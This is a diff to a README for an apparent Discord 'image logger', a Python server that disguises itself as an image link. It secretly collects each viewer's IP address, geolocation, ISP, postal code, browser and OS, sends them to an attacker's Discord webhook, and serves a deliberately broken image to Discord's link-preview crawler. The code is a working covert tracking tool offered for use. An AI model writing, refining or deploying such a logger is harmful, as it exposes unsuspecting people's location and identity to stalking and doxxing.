@@ -5,7 +5,7 @@
 
 # How to use it?
 Replace "WEBHOOK" with a Discord Webhook. <br>
-Also replace the bindata with a image.
+Also replace the bindata with the link to an image.
 ```py
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -13,7 +13,8 @@ import httpx, base64, httpagentparser
 
 webhook = 'WEBHOOK'
 
-bindata = base64.b85decode(b'Base85 encoded image')
+bindata = httpx.get('link to image here').content
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
@@ -71,7 +72,7 @@ class handler(BaseHTTPRequestHandler):
         useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
         os, browser = httpagentparser.simple_detect(useragent)
         if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
-            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
+            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
             else: pass
         else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
         return
